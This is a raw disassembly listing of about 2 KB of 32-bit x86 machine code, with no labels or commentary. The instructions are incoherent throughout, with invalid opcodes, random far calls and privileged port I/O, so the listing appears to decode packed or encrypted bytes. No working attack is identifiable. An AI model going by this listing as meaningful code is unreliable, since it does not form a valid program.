  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	mov    ds:0xe60a625e,eax
  4028e5:	add    edi,DWORD PTR [esi+0x7e]
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	je     0x4028e7
  4028ee:	bnd jmp 0x40289e
  4028f1:	mov    edi,0xdb9af9ec
  4028f6:	add    BYTE PTR [eax+0x4137e9d6],bh
  4028fc:	dec    ebx
  4028fd:	in     eax,0x6e
  4028ff:	fsub   DWORD PTR [esi+0xe4c178e]
  402905:	jle    0x4028fd
  402907:	dec    ecx
  402908:	dec    esi
  402909:	loope  0x402979
  40290b:	mov    BYTE PTR [edx+0x61],cl
  40290e:	(bad)  
  40290f:	aaa    
  402910:	neg    DWORD PTR [edi]
  402912:	mov    al,ds:0x52b43c1a
  402917:	push   0x50
  402919:	fwait
  40291a:	sub    al,0xee
  40291c:	sub    esi,0xffffffff
  40291f:	inc    ebp
  402920:	xlat   BYTE PTR ds:[ebx]
  402921:	(bad)  
  402922:	xor    BYTE PTR [esi],dh
  402924:	mov    esi,?
  402926:	lock in al,0xa4
  402929:	dec    esp
  40292a:	and    BYTE PTR ds:0xd6c9674c,0x64
  402931:	xchg   BYTE PTR [ebx],dl
  402933:	cdq    
  402934:	mov    ds:0x106ea93c,eax
  402939:	pop    ss
  40293a:	push   ss
  40293b:	popf   
  40293c:	inc    edx
  40293d:	(bad)  
  40293e:	xchg   ecx,eax
  40293f:	jb     0x402929
  402941:	sub    ch,0x69
  402944:	outs   dx,BYTE PTR ds:[esi]
  402945:	stos   BYTE PTR es:[edi],al
  402946:	and    eax,0xcd02745f
  40294b:	fadd   QWORD PTR [ebx-0x3d]
  40294e:	mov    esi,?
  402950:	(bad)  [eax+eiz*1-0x5e]
  402954:	add    DWORD PTR [eax],ecx
  402956:	adc    BYTE PTR [ecx],dl
  402958:	scas   al,BYTE PTR es:[edi]
  402959:	add    eax,0x9c80ced4
  40295e:	push   ecx
  40295f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402960:	fdivr  DWORD PTR [ebp+0x6]
  402963:	clc    
  402964:	lods   al,BYTE PTR ds:[esi]
  402965:	(bad)  
  402966:	and    al,0xe1
  402968:	(bad)  
  402969:	pop    eax
  40296a:	aas    
  40296b:	dec    esi
  40296c:	jp     0x40295e
  40296e:	mov    edi,0x7e5d7a74
  402973:	add    eax,0xec77204f
  402978:	xor    esp,DWORD PTR [ebx+edx*4]
  40297b:	scas   eax,DWORD PTR es:[edi]
  40297c:	and    BYTE PTR [eax-0x1f61ff53],dh
  402982:	imul   ecx,DWORD PTR [edi+esi*4+0x1090bdfc],0x29
  40298a:	stos   BYTE PTR es:[edi],al
  40298b:	jg     0x40295f
  40298d:	je     0x402998
  40298f:	dec    esp
  402990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402991:	mov    DWORD PTR [eax-0x47a66989],esp
  402997:	iret   
  402998:	fsub   QWORD PTR [esi+0x27]
  40299b:	add    al,0x5
  40299d:	aam    0x23
  40299f:	mov    edi,0x8a87d131
  4029a4:	lahf   
  4029a5:	les    ebp,FWORD PTR [ebx+0x40609303]
  4029ab:	dec    edx
  4029ac:	lea    ebp,[ecx-0x33]
  4029af:	iret   
  4029b0:	jnp    0x4029e2
  4029b2:	fs jne 0x402a1b
  4029b5:	cmp    ecx,DWORD PTR [esp+eax*2-0x57]
  4029b9:	pop    edx
  4029ba:	mov    esi,0x4d727305
  4029bf:	xor    ebp,esp
  4029c1:	lods   al,BYTE PTR ds:[esi]
  4029c2:	imul   edx,esi,0x6c
  4029c5:	test   eax,0xe7e01f85
  4029ca:	lods   eax,DWORD PTR ds:[esi]
  4029cb:	hlt    
  4029cc:	push   ecx
  4029cd:	sub    BYTE PTR [edi],ah
  4029cf:	lahf   
  4029d0:	mov    al,0xae
  4029d2:	dec    ebp
  4029d3:	dec    esi
  4029d4:	or     al,0x51
  4029d6:	push   cs
  4029d7:	jb     0x402a2b
  4029d9:	popa   
  4029da:	dec    esp
  4029db:	ds enter 0x4d7f,0x32
  4029e0:	pop    ds
  4029e1:	mov    esp,0x1492475c
  4029e6:	mov    esi,0xff1fa369
  4029eb:	out    dx,eax
  4029ec:	mov    eax,ds:0x5c00f90c
  4029f1:	mov    ds:0x516dd205,eax
  4029f6:	xchg   edx,eax
  4029f7:	pop    esi
  4029f8:	sub    al,0xbc
  4029fa:	aam    0xec
  4029fc:	sbb    bl,bl
  4029fe:	cli    
  4029ff:	and    ah,BYTE PTR [edi+0x31]
  402a02:	push   0xffffffa3
  402a04:	mov    ?,WORD PTR [ebp+0x39]
  402a07:	pop    esi
  402a08:	sub    eax,0x656d6550
  402a0d:	ins    DWORD PTR es:[edi],dx
  402a0e:	ins    DWORD PTR es:[edi],dx
  402a0f:	daa    
  402a10:	fist   DWORD PTR [esi+0x73e18745]
  402a16:	or     ebp,DWORD PTR [edi-0x6a]
  402a19:	stos   DWORD PTR es:[edi],eax
  402a1a:	sahf   
  402a1b:	nop
  402a1c:	jb     0x402a12
  402a1e:	out    dx,eax
  402a1f:	out    0xf4,eax
  402a21:	sbb    BYTE PTR [ebx-0x20],dh
  402a24:	std    
  402a25:	push   es
  402a26:	loope  0x4029df
  402a28:	ret    
  402a29:	mov    bh,0xc3
  402a2b:	jo     0x402a64
  402a2d:	mov    ecx,0xd1553d44
  402a32:	loope  0x402a28
  402a34:	jbe    0x402a1e
  402a36:	adc    ebp,0xb373100f
  402a3c:	in     eax,dx
  402a3d:	or     DWORD PTR [edi+0x17],edx
  402a40:	in     al,dx
  402a41:	or     al,0x1
  402a43:	out    0x1a,al
  402a45:	push   ebx
  402a46:	bound  edi,QWORD PTR [ecx+0x6b]
  402a49:	push   ss
  402a4a:	push   ds
  402a4b:	adc    dl,0xdc
  402a4e:	ja     0x402a96
  402a50:	mov    dh,0xdd
  402a52:	cmc    
  402a53:	je     0x402a28
  402a55:	pop    esp
  402a56:	push   edx
  402a57:	jnp    0x402a11
  402a59:	adc    al,0x25
  402a5b:	xchg   edx,eax
  402a5c:	pop    ebx
  402a5d:	dec    edx
  402a5e:	ss (bad) 
  402a60:	xchg   edx,eax
  402a61:	es push ss
  402a63:	ret    0x8d59
  402a66:	jo     0x4029ee
  402a68:	xor    al,0xa6
  402a6a:	inc    esp
  402a6b:	push   ds
  402a6c:	mov    ah,0xb1
  402a6e:	and    al,0xa4
  402a70:	cmp    eax,0x3f1e8d47
  402a75:	xchg   edx,eax
  402a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a77:	adc    edx,DWORD PTR [ecx-0x247b6651]
  402a7d:	out    0x6f,al
  402a7f:	and    bl,BYTE PTR ds:0x326b36bd
  402a85:	fcmovnu st,st(0)
  402a87:	mov    eax,0x36d14283
  402a8c:	or     eax,0xa3cb0f57
  402a91:	test   dl,bh
  402a93:	xchg   ecx,eax
  402a94:	mov    WORD PTR [ebp+ecx*2+0x1b],fs
  402a98:	push   0xfffffffd
  402a9a:	imul   eax,DWORD PTR [edx],0x56
  402a9d:	rcl    BYTE PTR [ebx],1
  402a9f:	jnp    0x402a83
  402aa1:	push   esp
  402aa2:	enter  0xa625,0xe9
  402aa6:	neg    DWORD PTR [edx+edx*4-0x8]
  402aaa:	or     al,0xe
  402aac:	push   esp
  402aad:	sub    eax,0xc5a7cfd0
  402ab2:	pop    edx
  402ab3:	fisttp QWORD PTR [eax+0x49ed661]
  402ab9:	pop    ecx
  402aba:	fisubr DWORD PTR [esi+0x1e]
  402abd:	sbb    esi,DWORD PTR [esi]
  402abf:	sub    DWORD PTR [esi-0x60],ebp
  402ac2:	jne    0x402b04
  402ac4:	sti    
  402ac5:	push   ebp
  402ac6:	outs   dx,BYTE PTR ds:[esi]
  402ac7:	js     0x402a7e
  402ac9:	rol    DWORD PTR [eax-0x57],cl
  402acc:	sbb    ebx,ebx
  402ace:	lock retf 
  402ad0:	outs   dx,BYTE PTR ds:[esi]
  402ad1:	rol    BYTE PTR [ebx],1
  402ad3:	call   0xfb3b:0x5e818d40
  402ada:	cmc    
  402adb:	jecxz  0x402b4c
  402add:	sub    eax,0x7c1cc9da
  402ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ae3:	sub    cl,BYTE PTR [ecx]
  402ae5:	in     eax,0x23
  402ae7:	les    edx,FWORD PTR [ecx]
  402ae9:	lahf   
  402aea:	imul   edi,DWORD PTR [eax-0x6d1f0e17],0x777942e2
  402af4:	xchg   esp,eax
  402af5:	in     eax,dx
  402af6:	lahf   
  402af7:	xchg   edx,eax
  402af8:	jne    0x402ae7
  402afa:	retf   0x98c0
  402afd:	out    0x5b,al
  402aff:	mov    esi,0xedf511c4
  402b04:	call   0xa3ed610c
  402b09:	shl    BYTE PTR [ecx*2-0x5b728543],cl
  402b10:	fcomi  st,st(3)
  402b12:	dec    ebp
  402b13:	inc    ecx
  402b14:	xchg   edi,eax
  402b15:	sub    al,0xc0
  402b17:	add    eax,0x5fa8440d
  402b1c:	mov    ecx,0xdd56efbc
  402b21:	loop   0x402afe
  402b23:	or     eax,0x5b4d6b05
  402b28:	jge    0x402b20
  402b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b2b:	gs inc esi
  402b2d:	call   0x7f27:0x2ff96151
  402b34:	xchg   esp,eax
  402b35:	cs retf 
  402b37:	mov    edi,0xd789f115
  402b3c:	cmp    BYTE PTR [ebp-0x9],dh
  402b3f:	in     al,0x66
  402b41:	mov    BYTE PTR [esi],0x8b
  402b44:	pop    eax
  402b45:	mov    ebp,eax
  402b47:	inc    eax
  402b48:	lea    edi,[esi]
  402b4a:	mov    cl,0x3d
  402b4c:	int    0x30
  402b4e:	pop    ebp
  402b4f:	call   0x117561d0
  402b54:	pusha  
  402b55:	fdiv   DWORD PTR [edx]
  402b57:	xchg   edi,eax
  402b58:	sbb    eax,0xaecedc3e
  402b5d:	jge    0x402bd8
  402b5f:	add    bh,cl
  402b61:	bound  ebp,QWORD PTR [edi+0x5d]
  402b64:	popa   
  402b65:	gs cmp al,0xb3
  402b68:	push   ecx
  402b69:	push   ebp
  402b6a:	data16 clc 
  402b6c:	adc    ah,BYTE PTR [ecx-0x47]
  402b6f:	in     al,dx
  402b70:	push   ss
  402b71:	(bad)  
  402b72:	pop    eax
  402b73:	int    0x62
  402b75:	les    esp,FWORD PTR [ebp+0x4d]
  402b78:	push   0x2b74f6be
  402b7d:	lea    ebp,ds:0xee661e0c
  402b83:	(bad)  
  402b84:	retf   
  402b85:	mov    ebx,DWORD PTR [ebx-0x6001e3a]
  402b8b:	or     DWORD PTR [esi+0x61],esp
  402b8e:	add    BYTE PTR ss:[edx+0x23497170],ch
  402b95:	and    BYTE PTR [ebx-0x18],al
  402b98:	(bad)  
  402b99:	iret   
  402b9a:	out    dx,eax
  402b9b:	mov    esi,ebp
  402b9d:	fnstenv [esi+edx*1]
  402ba0:	fdivr  st,st(5)
  402ba2:	jo     0x402b50
  402ba4:	mov    dh,0x29
  402ba6:	call   DWORD PTR [ecx+ecx*2]
  402ba9:	dec    eax
  402baa:	push   ds
  402bab:	ja     0x402b65
  402bad:	adc    al,0xed
  402baf:	repnz fldenv [ebx+ebp*4+0x43bdfe59]
  402bb7:	or     eax,0x37b17b3d
  402bbc:	dec    esp
  402bbd:	jb     0x402b72
  402bbf:	sahf   
  402bc0:	sbb    DWORD PTR ds:0xcda4c427,ebp
  402bc6:	stos   DWORD PTR es:[edi],eax
  402bc7:	mov    al,0x22
  402bc9:	pop    ss
  402bca:	hlt    
  402bcb:	mov    ds:0xd627e36d,eax
  402bd0:	ret    0x3913
  402bd3:	xchg   ebx,eax
  402bd4:	fnstcw WORD PTR [esi+0x149cdd5c]
  402bda:	icebp  
  402bdb:	retf   0x4be5
  402bde:	sub    al,0xc
  402be0:	into   
  402be1:	imul   ebx,eax,0xeab878e7
  402be7:	std    
  402be8:	dec    ecx
  402be9:	add    DWORD PTR [eax+eax*4],ecx
  402bec:	cwde   
  402bed:	not    DWORD PTR [edx]
  402bef:	(bad)  
  402bf0:	pusha  
  402bf1:	push   esi
  402bf2:	sbb    bh,dh
  402bf4:	pop    ds
  402bf5:	cmp    BYTE PTR [esi-0xd2def36],bl
  402bfb:	clc    
  402bfc:	enter  0x15ba,0x7
  402c00:	gs hlt 
  402c02:	sub    DWORD PTR [ecx],ecx
  402c04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c05:	aam    0x4
  402c07:	sahf   
  402c08:	popa   
  402c09:	fmul   DWORD PTR [edi]
  402c0b:	or     al,BYTE PTR [edi+0x4e0569c0]
  402c11:	rcl    BYTE PTR [ecx+ebp*1],1
  402c14:	neg    BYTE PTR [ebp+0x45ba0093]
  402c1a:	int    0x3f
  402c1c:	aad    0x44
  402c1e:	ss daa 
  402c20:	xchg   ecx,eax
  402c21:	xor    BYTE PTR [ebp-0x66],dh
  402c24:	push   0x25
  402c26:	jl     0x402be8
  402c28:	sbb    BYTE PTR [eax-0x46],0x6e
  402c2c:	sbb    DWORD PTR [ebp+0x50],0x30
  402c30:	fwait
  402c31:	and    eax,0x444413b0
  402c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c37:	xor    BYTE PTR [ecx+0x15ca5dd6],dl
  402c3d:	fwait
  402c3e:	je     0x402bef
  402c40:	fimul  WORD PTR [edi]
  402c42:	add    BYTE PTR [edx+0x1b],bl
  402c45:	and    al,0x49
  402c47:	fsubr  QWORD PTR [eax-0x744a55a3]
  402c4d:	bound  ecx,QWORD PTR [edx-0x7fcf8c58]
  402c53:	es retf 0x14a4
  402c57:	xchg   esi,eax
  402c58:	push   edx
  402c59:	es cs inc eax
  402c5c:	lahf   
  402c5d:	dec    ebp
  402c5e:	sub    BYTE PTR ds:0x2e84f3ad,ch
  402c64:	scas   al,BYTE PTR es:[edi]
  402c65:	or     eax,DWORD PTR [ebx]
  402c67:	pop    esp
  402c68:	or     bl,BYTE PTR [ecx+0x1ab8e77e]
  402c6e:	xor    DWORD PTR [edx],edx
  402c70:	out    0xe3,al
  402c72:	mov    WORD PTR [edi-0x318d5e98],gs
  402c78:	out    dx,eax
  402c79:	in     al,dx
  402c7a:	add    eax,0x15be6718
  402c7f:	sub    DWORD PTR [ebx+0x2081f045],ecx
  402c85:	popf   
  402c86:	sbb    al,0x75
  402c88:	add    cl,ch
  402c8a:	retf   0xfffb
  402c8d:	dec    DWORD PTR [ebx+0x558bf445]
  402c93:	call   0xff7deea3
  402c98:	sub    eax,0x840ffabf
  402c9d:	mov    edi,0x8b000003
  402ca2:	inc    ebp
  402ca3:	lock xor DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	je     0x402d0a
  402cc2:	push   ds
  402cc3:	leave  
  402cc4:	or     al,BYTE PTR [edi]
  402cc6:	jle    0x402d46
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	loop   0x402d47
  402cce:	(bad)  
  402cd0:	inc    al
  402cd2:	push   ecx
  402cd3:	outs   dx,BYTE PTR ds:[esi]
  402cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cd5:	ins    DWORD PTR es:[edi],dx
  402cd6:	xchg   ebx,eax
  402cd7:	sbb    eax,0xa55d8589
  402cdc:	hlt    
  402cdd:	and    eax,0x5fd2781e
  402ce2:	iret   
  402ce3:	inc    ebx
  402ce4:	mov    ch,0x50
  402ce6:	neg    DWORD PTR [ebx+0x76]
  402ce9:	popf   
  402cea:	mov    bl,0x71
  402cec:	push   ebp
  402ced:	jecxz  0x402d52
  402cef:	outs   dx,DWORD PTR ds:[esi]
  402cf0:	jno    0x402c7a
  402cf2:	inc    esi
  402cf3:	stos   DWORD PTR es:[edi],eax
  402cf4:	sub    al,0x95
  402cf6:	shl    BYTE PTR [ebp-0x2e7e61e6],1
  402cfc:	call   DWORD PTR [ecx+0x10]
  402cff:	and    ch,BYTE PTR [ebp+edx*4-0x5cc25972]
  402d06:	loopne 0x402cab
  402d08:	cli    
  402d09:	stos   BYTE PTR es:[edi],al
  402d0a:	sub    DWORD PTR [eax+0x5f],0xffffffb4
  402d0e:	lds    eax,FWORD PTR ds:0x372c3d5b
  402d14:	hlt    
  402d15:	rol    DWORD PTR [ecx+0x45],cl
  402d18:	(bad)  
  402d19:	jb     0x402d59
  402d1b:	retf   
  402d1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d1d:	push   ds
  402d1e:	dec    esp
  402d1f:	shl    DWORD PTR [eax+0x47e46fcd],0x20
  402d26:	cmp    al,0xe5
  402d28:	ds jle 0x402d5d
  402d2b:	(bad)  
  402d2c:	fbstp  TBYTE PTR [edx-0x1c]
  402d2f:	lods   al,BYTE PTR gs:[esi]
  402d31:	sbb    esp,DWORD PTR [edx+0x4f]
  402d34:	mov    eax,esp
  402d36:	hlt    
  402d37:	int3   
  402d38:	push   esi
  402d39:	clc    
  402d3a:	and    BYTE PTR ds:0x42e75757,bl
  402d41:	call   DWORD PTR [ebx+0x3a]
  402d44:	sub    al,cl
  402d46:	daa    
  402d47:	push   esi
  402d48:	ds int3 
  402d4a:	cwde   
  402d4b:	pop    ss
  402d4c:	out    dx,eax
  402d4d:	or     DWORD PTR [ebx+0x7],edx
  402d50:	call   0x445a0a96
  402d55:	pushf  
  402d56:	stos   DWORD PTR es:[edi],eax
  402d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d58:	sbb    DWORD PTR [eax+0x2768ed44],ecx
  402d5e:	jg     0x402ce8
  402d60:	js     0x402d35
  402d62:	ret    
  402d63:	leave  
  402d64:	out    0xbb,al
  402d66:	xor    DWORD PTR [edx+0x19aa9b58],ecx
  402d6c:	sub    DWORD PTR [ebx+0x73c2ba5c],edx
  402d72:	xchg   ecx,eax
  402d73:	push   ecx
  402d74:	ins    DWORD PTR es:[edi],dx
  402d75:	jb     0x402d8b
  402d77:	mov    dl,BYTE PTR [edx-0x36]
  402d7a:	fidivr WORD PTR [edi+0x7f]
  402d7d:	daa    
  402d7e:	fsub   QWORD PTR [ebx-0x27]
  402d81:	mov    cl,0xb9
  402d83:	dec    edx
  402d84:	or     eax,0x4c2414a4
  402d89:	scas   al,BYTE PTR es:[edi]
  402d8a:	aam    0x1a
  402d8c:	es xor edi,ecx
  402d8f:	cmp    BYTE PTR [ecx],bh
  402d91:	push   eax
  402d92:	ss pop esp
  402d94:	mov    cl,0x43
  402d96:	aas    
  402d97:	aaa    
  402d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d99:	fcom   DWORD PTR [ecx]
  402d9b:	sub    al,0xcb
  402d9d:	inc    ecx
  402d9e:	jp     0x402dfc
  402da0:	ret    
  402da1:	push   ecx
  402da2:	dec    esi
  402da3:	lds    esp,FWORD PTR [edx+0x664cf3fa]
  402da9:	mov    ebp,DWORD PTR [ebp+0x22]
  402dac:	push   0x9c23d2ff
  402db1:	jl     0x402dd7
  402db3:	pop    ebp
  402db4:	sbb    edx,DWORD PTR [esp+eiz*8-0x222d36d]
  402dbb:	xchg   BYTE PTR [ebx],dh
  402dbd:	add    al,dh
  402dbf:	bound  edi,QWORD PTR [esi+0x69]
  402dc2:	sbb    DWORD PTR [edx],esp
  402dc4:	mov    ss,WORD PTR [edi-0x4d85873f]
  402dca:	sar    DWORD PTR [ebp-0x1810f9a3],1
  402dd0:	(bad)  
  402dd1:	jecxz  0x402d73
  402dd3:	sub    al,0x19
  402dd5:	xchg   dh,dl
  402dd7:	mov    eax,DWORD PTR [ebp-0x27782d3e]
  402ddd:	dec    edi
  402dde:	push   ss
  402ddf:	repz pop edx
  402de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402de2:	iret   
  402de3:	push   edi
  402de4:	nop
  402de5:	cmp    eax,0x99b18738
  402dea:	inc    esp
  402deb:	arpl   WORD PTR [ebx-0x60f326b5],sp
  402df1:	pop    ebp
  402df2:	js     0x402e72
  402df4:	int3   
  402df5:	mov    esp,DWORD PTR [ecx+edi*1]
  402df8:	(bad)  
  402df9:	sub    al,0xaf
  402dfb:	lods   eax,DWORD PTR ds:[esi]
  402dfc:	loope  0x402e74
  402dfe:	jno    0x402de0
  402e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e01:	inc    ebx
  402e02:	shl    DWORD PTR [ecx+0xf],0xf6
  402e06:	add    DWORD PTR [edx],0x682845aa
  402e0c:	jl     0x402e1f
  402e0e:	or     eax,0x41c19e18
  402e13:	adc    esp,esi
  402e15:	dec    esp
  402e16:	mov    cl,0x53
  402e18:	in     al,0x82
  402e1a:	je     0x402df3
  402e1c:	test   DWORD PTR [esi-0x4a],esp
  402e1f:	arpl   sp,bx
  402e21:	sub    ah,BYTE PTR ds:0x870cc48a
  402e27:	adc    esi,DWORD PTR [ebp-0x2a]
  402e2a:	in     al,0x1e
  402e2c:	add    dh,ch
  402e2e:	(bad)  
  402e2f:	adc    DWORD PTR [esi+ebp*2-0x1c],edx
  402e33:	sbb    ch,BYTE PTR [ebx-0x6f]
  402e36:	dec    ebp
  402e37:	inc    esi
  402e38:	sub    cl,ch
  402e3a:	jne    0x402dbf
  402e3c:	int3   
  402e3d:	pushf  
  402e3e:	fwait
  402e3f:	pop    esi
  402e40:	pop    ds
  402e41:	arpl   dx,ax
  402e43:	pop    esi
  402e44:	cli    
  402e45:	push   ds
  402e46:	and    DWORD PTR [ebx+0x815fc88],esi
  402e4c:	sub    eax,0x2b633d16
  402e51:	dec    ebx
  402e52:	sar    edx,cl
  402e54:	or     al,0x35
  402e56:	pop    esp
  402e57:	adc    BYTE PTR [esi-0x660be76c],dl
  402e5d:	sbb    dl,BYTE PTR [ebx-0x3b84dcb2]
  402e63:	and    DWORD PTR [edi+0x4782e310],edi
  402e69:	js     0x402eb8
  402e6b:	inc    edx
  402e6c:	aas    
  402e6d:	pop    edi
  402e6e:	sar    BYTE PTR [edx+0x5b],0x30
  402e72:	mov    dh,0xa5
  402e74:	lea    ebp,ss:[ebp+0x7e40671f]
  402e7b:	arpl   WORD PTR [ebx],ax
  402e7d:	jne    0x402e9b
  402e7f:	dec    ebx
  402e80:	je     0x402e72
  402e82:	add    dh,BYTE PTR [ecx-0x7e]
  402e85:	mov    ds:0x1045f377,eax
  402e8a:	mov    dh,0x6e
  402e8c:	or     ah,bh
  402e8e:	shr    ah,cl
  402e90:	sub    DWORD PTR [esi+0x19],esp
  402e93:	mov    al,ds:0xe24076d7
  402e98:	(bad)  
  402e99:	push   edi
  402e9a:	(bad)  
  402e9b:	cwde   
  402e9c:	loop   0x402f08
  402e9e:	inc    ecx
  402e9f:	aad    0x14
  402ea1:	xchg   ebx,eax
  402ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea3:	xor    BYTE PTR [edx+ebp*2+0x0],bh
  402ea7:	repz mov ebx,0xfc67754f
  402ead:	(bad)  
  402eae:	loopne 0x402e92
  402eb0:	push   edi
  402eb1:	jg     0x402e5e
  402eb3:	nop
  402eb4:	jl     0x402e5e
  402eb6:	fistp  DWORD PTR fs:[esi+0x294c26f]
  402ebd:	or     DWORD PTR [ebx],ebx
  402ebf:	mov    es,WORD PTR [eax+0x4c]
  402ec2:	(bad)  [ebp-0x13]
  402ec5:	sbb    bl,BYTE PTR [ecx+0x27e6b2b4]
  402ecb:	inc    esp
  402ecc:	aaa    
  402ecd:	lea    esp,[esi]
  402ecf:	push   esi
  402ed0:	pop    ecx
  402ed1:	push   ebp
  402ed2:	into   
  402ed3:	adc    ebx,0x3c7c850c
  402ed9:	daa    
  402eda:	mov    cl,0xd6
  402edc:	not    DWORD PTR [ebx+0x76]
  402edf:	inc    ebp
  402ee0:	cdq    
  402ee1:	fimul  WORD PTR [edi]
  402ee3:	pop    ds
  402ee4:	mov    cl,0xff
  402ee6:	xchg   edi,eax
  402ee7:	imul   ecx,edi,0xfffffff7
  402eea:	pop    eax
  402eeb:	leave  
  402eec:	scas   al,BYTE PTR es:[edi]
  402eed:	sar    al,cl
  402eef:	das    
  402ef0:	adc    al,BYTE PTR [ecx]
  402ef2:	add    ah,BYTE PTR [ecx+0x7c]
  402ef5:	scas   eax,DWORD PTR es:[edi]
  402ef6:	mov    al,0x25
  402ef8:	pop    edx
  402ef9:	leave  
  402efa:	imul   esi,DWORD PTR [edi],0x74732593
  402f00:	adc    BYTE PTR [edx+0x3d],ah
  402f03:	jmp    0x402f7d
  402f05:	fcomp  DWORD PTR [ebp-0x1de88e9b]
  402f0b:	inc    esi
  402f0c:	bound  esi,QWORD PTR [ebx+0x4dddd8f4]
  402f12:	ja     0x402f93
  402f14:	mov    cl,BYTE PTR [eax]
  402f16:	sbb    eax,0xca8a6422
  402f1b:	test   al,0x81
  402f1d:	xor    BYTE PTR [eax],dh
  402f1f:	xor    DWORD PTR [ebx],edi
  402f21:	aas    
  402f22:	inc    ecx
  402f23:	and    ch,BYTE PTR [ebx]
  402f25:	xchg   ebp,eax
  402f26:	pop    eax
  402f27:	inc    esi
  402f28:	jb     0x402ed3
  402f2a:	inc    esp
  402f2b:	(bad)  
  402f2c:	aam    0xea
  402f2e:	ret    0xc9da
  402f31:	imul   esp,DWORD PTR [ecx+0x6df0c7c],0x652a60ec
  402f3b:	xchg   DWORD PTR [eax+0x6c3825ff],ecx
  402f41:	add    al,0xa6
  402f43:	cld    
  402f44:	in     al,0x6
  402f46:	out    0x2c,eax
  402f48:	jmp    0x5b824f44
  402f4d:	out    dx,eax
  402f4e:	inc    ebx
  402f4f:	mov    ebp,DWORD PTR [ebx]
  402f51:	cmp    edx,0x645d460f
  402f57:	fnstsw WORD PTR [ebx+0x1a80cf91]
  402f5d:	scas   eax,DWORD PTR es:[edi]
  402f5e:	into   
  402f5f:	aas    
  402f60:	in     al,dx
  402f61:	aam    0x83
  402f63:	int3   
  402f64:	fwait
  402f65:	ins    BYTE PTR es:[edi],dx
  402f66:	rcl    bh,1
  402f68:	xor    eax,0x9c9a3a5c
  402f6d:	push   ds
  402f6e:	xchg   edi,eax
  402f6f:	xchg   ebp,eax
  402f70:	sti    
  402f71:	pusha  
  402f72:	push   ss
  402f73:	pop    ebx
  402f74:	retf   0x2061
  402f77:	mov    ah,0xe6
  402f79:	stos   BYTE PTR es:[edi],al
  402f7a:	in     eax,0xa1
  402f7c:	mov    esi,ebp
  402f7e:	imul   edx,DWORD PTR [ecx-0x75],0x489113d4
  402f85:	push   es
  402f86:	jecxz  0x402fda
  402f88:	dec    ebx
  402f89:	mov    esi,0x8927f6aa
  402f8e:	mov    DWORD PTR [edi-0x2f],ebp
  402f91:	js     0x402fdb
  402f93:	stos   BYTE PTR es:[edi],al
  402f94:	mov    esi,0x363aa0a0
  402f99:	std    
  402f9a:	mov    esp,0x40f0f7f3
  402f9f:	push   0xffffffb5
  402fa1:	push   es
  402fa2:	or     al,0xac
  402fa4:	cmp    eax,0xbc475b39
  402fa9:	mov    ebp,0x8283d22e
  402fae:	loop   0x402fac
  402fb0:	inc    esi
  402fb1:	or     BYTE PTR [eax],ch
  402fb3:	push   es
  402fb4:	inc    esi
  402fb5:	lds    ecx,FWORD PTR [eax+0x71]
  402fb8:	das    
  402fb9:	cld    
  402fba:	cmp    edx,eax
  402fbc:	and    eax,0x63c98de2
  402fc1:	(bad)
  402fc4:	bnd jne 0x40302a
  402fc7:	es adc eax,0xb2e5eedf
  402fcd:	xchg   esi,eax
  402fce:	ins    BYTE PTR es:[edi],dx
  402fcf:	loope  0x402fcf
  402fd1:	out    dx,eax
  402fd2:	xchg   BYTE PTR [esi-0x6aefa821],ah
  402fd8:	pop    ecx
  402fd9:	nop
  402fda:	popf   
  402fdb:	dec    edx
  402fdc:	lea    esi,[edi-0x15496936]
  402fe2:	repz mov ebx,0xfaafb343
  402fe8:	fimul  DWORD PTR [esi*1-0x203ffd06]
  402fef:	add    DWORD PTR [esi],eax
  402ff1:	push   edx
  402ff2:	xchg   edx,eax
  402ff3:	sub    eax,0x698ec335
  402ff8:	adc    ah,BYTE PTR [ebx-0x2c005462]
  402ffe:	mov    ebp,0x740f4fad
  403003:	daa    
  403004:	je     0x40301e
  403006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403008:	push   edx
  403009:	out    dx,al
  40300a:	out    dx,al
  40300b:	rcl    DWORD PTR [eax+0x18],1
  40300e:	icebp  
  40300f:	dec    BYTE PTR [ecx]
  403011:	sbb    DWORD PTR [eax+0x405ec4cf],esi
  403017:	repnz cli 
  403019:	pop    edi
  40301a:	call   DWORD PTR [ebp+ebx*4-0x6bdfcea3]
  403021:	ja     0x40305f
  403023:	imul   edi,DWORD PTR [eax+0x5dd4c462],0x14084b17
  40302d:	sbb    BYTE PTR [ebp-0x4],ch
  403030:	mov    bh,0x18
  403032:	inc    ebp
  403033:	daa    
  403034:	adc    DWORD PTR [edx+0x328b4956],ecx
  40303a:	push   ebx
  40303b:	dec    esp
  40303c:	jb     0x4030a1
  40303e:	fmul   st,st(0)
  403040:	mov    eax,0x884d01d6
  403045:	mov    al,ds:0x84f901f6
  40304a:	call   0x65605355
  40304f:	js     0x403022
  403051:	sbb    al,0xd8
  403053:	div    BYTE PTR [ecx-0x7c]
  403056:	dec    ebp
  403057:	stos   DWORD PTR es:[edi],eax
  403058:	in     eax,dx
  403059:	stc    
  40305a:	mov    eax,0x95238af5
  40305f:	dec    esi
  403060:	mov    ax,WORD PTR [ebp-0x4]
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
